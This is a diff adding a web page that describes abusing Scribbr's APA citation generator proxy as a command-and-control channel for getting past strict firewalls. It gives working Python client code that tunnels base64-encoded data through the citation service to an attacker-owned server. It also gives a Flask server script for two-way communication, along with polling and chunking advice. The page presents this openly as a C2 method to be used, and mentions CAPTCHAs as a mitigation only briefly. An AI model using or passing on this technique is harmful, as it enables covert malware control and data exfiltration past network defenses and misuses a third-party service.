@@ -1,0 +1,54 @@
+---
+layout: page
+title: Citation generator C2
+---
+By abusing [APA citation generators](https://www.scribbr.com/citation/generator/apa/), we are able to send requests to any server we own, which allows for bidirectional communication. Note that this C2 method still requires you to own a server, and is vulnerable to legal takedowns, but it is extremely effective in bypassing firewalls, including whitelist-based ones. Essentially, it would work on any network where you can access [this](https://www.scribbr.com/citation/generator/apa/) site.
+## How it works
+> Cite a webpage, book, article, and more
+
+Visiting the website, you will realize that you can cite webpages. If you inspect the network traffic, you see that they send a request to your site of choice **through a proxy**. This, in terms of C2, is like striking gold. Now, you might be wondering, why would anyone send your requests through a proxy, when the request can just be made from the machine of the person trying to cite the page? The answer is simple - [CSRF](https://en.wikipedia.org/wiki/Cross-site_request_forgery#Client-side_safeguards). As most browsers block cross-origin requests except to sites that specifically allow it (which is a very small minority), pretty much all requests made by a client to arbitrary sites would be blocked by this. As such, they are forced to send a request to their own proxy servers, which then forwards it to your webserver of choice. The server then returns the title of the webpage you requested, which is meant to be used in a citation.
+## Abusing this for C2
+Inspecting the network traffic, we are able to recreate the requests needed to simulate a citation generation. As such, we can piece together this code:
+```py
+import requests, json, base64
+text = """Lorem ipsum dolor sit amet, consectetur adipiscing elit."""
+def query(text):
+    json_data = {
+        'query': 'http://[your server]/cite?data='+base64.b64encode(text.encode()).decode().split("=")[0],
+        'type': 'query',
+        'requestedSourceType': 'journal-article',
+        'orderBy': 'relevance',
+    }
+
+    resp = requests.post('https://autocite.cgs.scribbr.com/autocite', json=json_data).json()
+    if "error" in resp:
+        return resp["error"]
+    response = requests.get('https://autocite.cgs.scribbr.com/autocite/'+resp["requestId"])
+    out = base64.b64decode(json.loads(response.text.split("\n")[1].split("data: ")[1])["sources"][0]["data"]["title"].encode()).decode()
+    return out
+print(query(text))
+```
+We work with everything using base64 encoding, to prevent special characters from messing up communications. As we know that the citation proxy only returns a title, we will also need a custom server script to allow for bidirectional communication. We can do so using Flask:
+```py
+from flask import request, Flask
+app = Flask(__name__)
+import requests
+from requests.structures import CaseInsensitiveDict
+import base64
+
+@app.route("/cite" , methods=['GET'])
+def citation():
+    data = request.args['data']
+    b= "<head><title>"+base64.b64encode(base64.b64decode(data.encode("ascii")+b"==")+b" [MODIFIED]").decode()+"</title></head><body>Lorem ipsum dolor sit amet</body>"
+    print(base64.b64decode(data.encode("ascii")+b"==").decode())
+    return b
+    
+if __name__ == "__main__":
+	from waitress import serve
+	serve(app, host="0.0.0.0", port=1337)
+```
+The client-side code  is also simple enough to translate into any language of your choice, such as C. Using a simple polling cycle, effective C2 can be established, along with fully bidirectional communications.
+## Limits
+We noted that due to the base64 encoding, a maximum of approximately 730 characters could be transmitted at once. As such, we recommend chunking long messages into blocks of 500 characters to ensure no data is lost or truncated. We also note that there is 2 network requests required to establish bidirectional communication, something which could result in greater network overhead and more latency. We have also not verified if any ratelimits are present that may affect communications.
+
+In conclusion, this is a very robust method that can evade very strict firewalls. This method also stands out as it does not abuse domain fronting, allowing it to bypass TLS inspections too. However, due to the high network overhead and potential for rate limiting, as well as easy mitigation (by simply using CAPTCHAs), we feel that this should only be used as a last resort C2 for the strictest firewalls, where all other communication methods fail.
